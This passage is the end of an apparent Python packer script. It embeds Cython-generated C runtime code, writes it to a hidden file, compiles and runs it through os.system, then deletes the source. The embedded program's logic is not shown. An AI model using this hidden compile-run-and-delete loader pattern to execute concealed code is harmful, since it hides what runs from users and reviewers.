    (iternextfunc) __Pyx_Generator_Next,
    __pyx_Generator_methods,
    __pyx_Generator_memberlist,
    __pyx_Generator_getsets,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if CYTHON_USE_TP_FINALIZE
    0,
#else
    __Pyx_Coroutine_del,
#endif
    0,
#if CYTHON_USE_TP_FINALIZE
    __Pyx_Coroutine_del,
#elif PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_Generator_init(void) {
    __pyx_GeneratorType_type.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
    __pyx_GeneratorType_type.tp_iter = PyObject_SelfIter;
    __pyx_GeneratorType = __Pyx_FetchCommonType(&__pyx_GeneratorType_type);
    if (unlikely(!__pyx_GeneratorType)) {
        return -1;
    }
    return 0;
}

/* CStringEquals */
    static CYTHON_INLINE int __Pyx_StrEq(const char *s1, const char *s2) {
    while (*s1 != '\0' && *s1 == *s2) { s1++; s2++; }
    return *s1 == *s2;
}

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
